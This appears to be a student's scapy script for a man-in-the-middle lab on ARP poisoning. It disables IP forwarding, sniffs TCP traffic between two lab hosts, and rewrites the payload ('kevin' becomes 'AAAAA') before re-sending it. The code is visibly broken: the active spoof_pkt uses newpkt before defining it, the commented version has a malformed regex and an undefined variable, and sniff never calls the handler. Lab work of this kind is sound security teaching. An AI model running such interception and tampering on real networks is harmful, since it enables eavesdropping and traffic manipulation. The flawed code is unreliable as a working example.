from scapy.all import *
import os
"""
Poison A's ARP cache, so B's IP is mapped to M's Mac
Poison B's ARP cache, so A's IP is mapped to M's Mac
"""

# Step 1: Intercept Packets
# Disable IP forwarding:
os.system("sysctl net.ipv4.ip_forward=0")

# Step 2: Intercept Packets
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0A:09:00:05"
MAC_B = "02:42:0A:09:00:06"

f1 = f"tcp and (ether src {MAC_A} or ether src {MAC_B})"
f2 = f"tcp and (src host {IP_A} or dst host {IP_B})"

pkt = sniff(iface='eth0', filter=f1)

# Step 3: Modify Packets
# def spoof_pkt(pkt):
#     if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
#         newpkt = IP( bytes(pkt[IP]))
#         del(newpkt.chksum)
#         del(newpkt[TCP].payload)
#         del(newpkt[TCP].chksum)
#         if pkt[TCP].payload:
#             data = pkt[TCP].payload.load
#             newpkt = re.sub(r'[0-9a0zA-Z]', R'A', data.decode())
#             send(newpkt/newdata)
#         else:
#             send(newpkt)
#     elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
#         newpkt = IP(bytes(pkt[IP]))
#         del(newpkt.chksum)
#         del(newpkt[TCP].chksum)
#         send(newpkt)

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print(f"***{data}, length: {len(data)}")
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        newdata = data.replace(b'kevin', b'AAAAA')
        newpkt = newpkt/newdata
        send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = pkt[IP]
        send(newpkt)